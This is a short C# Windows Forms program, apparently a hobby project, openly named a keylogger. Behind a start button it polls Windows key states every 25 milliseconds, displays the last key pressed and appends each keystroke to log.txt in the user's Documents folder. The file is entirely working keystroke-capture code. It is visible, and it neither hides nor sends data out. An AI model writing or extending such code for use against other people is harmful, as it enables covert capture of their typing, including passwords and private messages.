using KeyLoggerGUI;
using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace KeyLoggerGUI
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();
		}

		private async void StartKeyloggerButton_Click(object sender, EventArgs e)
		{
			await KeyLogger.Logging.StartKeylogger(TestLabel, AppStatusLabel);
		}
	}
}

namespace KeyLogger
{
	public static class Logging
	{
		public static string saveDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
		public static string filepath = saveDirectory + @"/log.txt";

		public static bool keyloggerActive = true;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static async Task StartKeylogger(Label label, Label AppStatusLabel)
		{
			while (true)
			{
				await Task.Delay(25);
				if (keyloggerActive)
				{
					for (int i = 16; i < 127; i++)
					{
						int keyState = GetAsyncKeyState(i);
						if (keyState != 0)
						{
							label.Text = $"{(char)i}";
							try
							{
								using (StreamWriter sw = File.AppendText(filepath))
								{
									sw.WriteLine((char)i);
								}
							}
							catch (Exception e)
							{
								AppStatusLabel.Text = e.Message;
							}
						}
					}
				}
			}
		}
	}
}
